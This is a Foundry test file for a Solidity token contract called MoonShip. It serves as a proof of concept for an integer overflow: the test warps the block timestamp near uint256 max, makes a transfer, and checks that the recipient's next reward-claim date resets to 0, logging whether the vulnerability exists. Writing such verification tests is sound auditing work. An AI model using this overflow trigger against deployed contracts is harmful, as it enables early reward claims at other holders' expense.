// SPDX-License-Identifier: MIT
pragma solidity 0.6.8;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/moonship.sol";

contract MockRouter {
    address public factory;
    address public WETH;
    
    constructor(address _factory, address _weth) public {
        factory = _factory;
        WETH = _weth;
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x1234567890123456789012345678901234567891);
    }
}

contract MockWETH {
    function deposit() external payable {}
    function transfer(address, uint) external pure returns (bool) { return true; }
}

contract OverflowTest is Test {
    MoonShip public moonShip;
    address public mockFactory;
    address public mockWETH;
    address public mockRouter;
    address public owner = address(this);
    address public recipient = address(0x2);

    function setUp() public {
        // Setup router environment
        mockFactory = address(new MockFactory());
        mockWETH = address(new MockWETH());
        mockRouter = address(new MockRouter(mockFactory, mockWETH));
        
        // Deploy main contract
        moonShip = new MoonShip(payable(mockRouter));
    }

    function testTopUpClaimOverflow() public {
        // Get reward cycle block
        uint256 cycleBlock = moonShip.getRewardCycleBlock();
        
        // Query initial state BEFORE trigger
        console.log("--- BEFORE-Trigger State ---");
        uint256 beforeClaimDate = moonShip.nextAvailableClaimDate(recipient);
        console.log("Recipient's nextAvailableClaimDate before overflow trigger:", beforeClaimDate);

        // Set block timestamp to trigger overflow: max - cycleBlock + 1
        console.log("--- Trigger: Warp to Overflow Block ---");
        vm.warp(type(uint256).max - cycleBlock + 1);
        
        // Transfer to recipient to trigger topUpClaimCycleAfterTransfer
        uint256 smallAmount = 1;
        console.log("--- Trigger: Token Transfer ---");
        vm.prank(owner);
        moonShip.transfer(recipient, smallAmount);
        
        // Query state AFTER trigger
        console.log("--- AFTER-Trigger State ---");
        uint256 afterClaimDate = moonShip.nextAvailableClaimDate(recipient);
        console.log("Recipient's nextAvailableClaimDate after overflow trigger:", afterClaimDate);
        
        // Differential verification
        console.log("--- Verdict ---");
        if (afterClaimDate == 0) {
            console.log("State changed to 0 as expected (successful overflow)");
            console.log("Vulnerability Exists: Overflow caused next available claim date to reset to 0");
        } else {
            console.log("State did not change to 0 (overflow failed)");
            console.log("Vulnerability not Exist: Overflow did not reset claim date to 0");
        }
        
        // Original assertion maintained
        assertEq(afterClaimDate, 0, "Overflow should have set value to 0");
    }
}